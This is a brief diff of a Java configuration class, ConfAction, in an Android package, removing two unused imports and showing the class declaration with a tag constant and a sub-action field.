@@ -3,9 +3,6 @@ package com.android.networking.conf;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import com.android.networking.auto.Cfg;
-import com.android.networking.util.Check;
-
 public class ConfAction extends JSONConf {
 	private static final String TAG = "ActionConf";
 	public int subActionId;
